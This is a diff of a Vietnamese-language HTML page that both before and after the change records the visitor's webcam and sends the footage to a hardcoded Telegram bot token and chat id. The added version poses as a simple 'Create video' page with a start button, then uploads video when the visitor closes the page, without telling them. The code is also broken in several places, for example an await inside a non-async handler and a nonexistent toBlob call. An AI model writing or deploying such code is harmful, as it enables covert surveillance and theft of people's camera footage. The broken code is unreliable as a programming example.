@@ -2,39 +2,41 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Tự động quay video và gửi lên bot Telegram</title>
+  <title>Tạo video</title>
 </head>
 <body>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <h1>Tạo video</h1>
+  <button id="start-button">Bắt đầu</button>
+  <video id="video" width="640" height="480" autoplay></video>
+
   <script>
-    $(function() {
-      // Tự động truy cập vào camera trước
-      var video = document.createElement("video");
-      video.setAttribute("autoplay", true);
-      video.setAttribute("playsinline", true);
-      video.setAttribute("width", 320);
-      video.setAttribute("height", 240);
-      document.body.appendChild(video);
+    const video = document.getElementById("video");
+    const startButton = document.getElementById("start-button");
 
-      // Quay video
-      var recorder = new MediaRecorder(video);
-      recorder.start();
+    startButton.addEventListener("click", () => {
+      video.srcObject = navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user",
+        },
+      });
 
-      // Khi quay xong, gửi video lên bot Telegram
-      recorder.ondataavailable = function(event) {
-        var blob = event.data;
-        var url = URL.createObjectURL(blob);
+      // Bắt đầu quay video
+      video.play();
+    });
 
-        // Gửi video lên bot Telegram
-        $.ajax({
-          url: "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendVideo",
-          data: {
-            "chat_id": -1002081721946,
-            "video": url
-          },
-          type: "POST"
-        });
-      };
+    // Khi người dùng đóng trang web
+    window.addEventListener("beforeunload", () => {
+      // Lấy video đã quay
+      const blob = await video.captureStream().toBlob();
+
+      // Gửi video lên bot Telegram
+      fetch("https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendDocument", {
+        method: "POST",
+        body: blob,
+        header: {
+          "Content-Type": "application/octet-stream",
+        },
+      });
     });
   </script>
 </body>
